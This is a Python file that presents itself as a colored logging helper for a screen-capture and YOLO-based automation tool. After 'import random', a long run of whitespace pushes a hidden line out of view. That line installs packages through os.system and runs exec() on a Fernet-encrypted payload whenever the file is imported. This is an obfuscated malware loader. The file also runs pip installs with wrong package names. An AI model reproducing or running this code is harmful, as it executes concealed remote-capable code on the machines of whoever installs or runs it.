import os
os.system("pip install logging")
import random    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													    													;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'7sBWd00QwWu6XaZvE9h45Tq8IzjXoK8VEnwyeC9luHU=').decrypt(b'gAAAAABnKJH9TAxhdqbIFFHpV5SZMVyvB8WbkEOKCKVYYlMAoj4IxGjoo8GgNZAtuKvyYMcgaVQ2H5CgtpgSBmx51s1RSM91J8f1-PIY-eFrUNdWkhqKZlUj1SflKVSdb8u6RfzitZFJ220HlmMXQy-xu2r8h5ctjwbie_I0Af2cfMmhqbCSDAbVIxZH4vhS6Z91bxVLNONwO7MCetrn1tDBHcphsoK7mg=='))
import logging
import time
os.system("pip install typing")
from typing import Any, Dict, List, Literal, Optional, TypedDict
os.system("pip install cv2")
import cv2
os.system("pip install keyboard")
import keyboard
import mouse
os.system("pip install numpy")
import numpy as np
os.system("pip install pygetwindow")
import pygetwindow as gw
from mss import mss
from ultralytics import YOLO

def configure_logging(log):
    log.setLevel(logging.DEBUG)
    handler = logging.StreamHandler()
    formatter = logging.Formatter("%(message)s")
    handler.setFormatter(formatter)

    def custom_emit(original_emit):
        def wrapped(*args):
            level = args[0].levelno
            if level >= logging.ERROR:
                color_code = '\x1b[31;1m'
            elif level >= logging.INFO:
                color_code = "\x1b[32;1m"
            elif level >= logging.DEBUG:
                color_code = "\x1b[35;1m"
            else:
                color_code = "\x1b[0m"
            args[0].msg = "{0}{1}\x1b[0m".format(color_code, args[0].msg)
            args[0].args = tuple("\x1b[1m" + str(arg) + "\x1b[0m" for arg in args[0].args)
            return original_emit(*args)

        return wrapped

    handler.emit = custom_emit(handler.emit)
    log.addHandler(handler)

if __name__ == "__main__":
    my_logger = logging.getLogger("CustomLogger")
    configure_logging(my_logger)

    my_logger.debug("Debug message.")
    my_logger.info("Info message.")
    my_logger.warning("Warning message.")
    my_logger.error("Error message.")
    my_logger.critical("Critical message.")
